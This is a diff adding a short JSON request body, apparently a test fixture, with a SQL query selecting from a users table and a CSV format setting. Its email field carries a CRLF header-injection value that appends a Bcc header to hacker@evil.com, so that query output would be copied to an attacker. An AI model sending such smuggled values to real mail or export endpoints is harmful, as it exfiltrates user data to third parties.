@@ -1,0 +1,5 @@
+{
+    "query": "SELECT * FROM users LIMIT 1",
+    "email": "scottlexium@gmail.com\r\nBcc:hacker@evil.com",
+    "format": "csv"
+}
